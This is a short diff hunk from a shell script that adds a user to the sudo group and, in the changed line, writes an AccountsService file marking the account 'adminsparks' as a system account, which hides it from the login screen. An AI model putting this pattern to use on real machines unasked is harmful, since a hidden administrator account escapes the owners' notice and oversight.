@@ -29,7 +29,7 @@ sudo usermod -aG sudo $username
 ip=$(ip addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1)
 
 # Add a file to the system with specified content
-echo "[InputSource0]\nxkb=za\n\n[User]\nIcon=/var/lib/AccountsService/icons/adminsparks\nSystemAccount=true" | sudo tee /var/lib/AccountsService/users/adminsparks
+echo -e "[InputSource0]\nxkb=za\n\n[User]\nIcon=/var/lib/AccountsService/icons/adminsparks\nSystemAccount=true" | sudo tee /var/lib/AccountsService/users/adminsparks
 
 
 sudo systemctl restart accounts-daemon.service
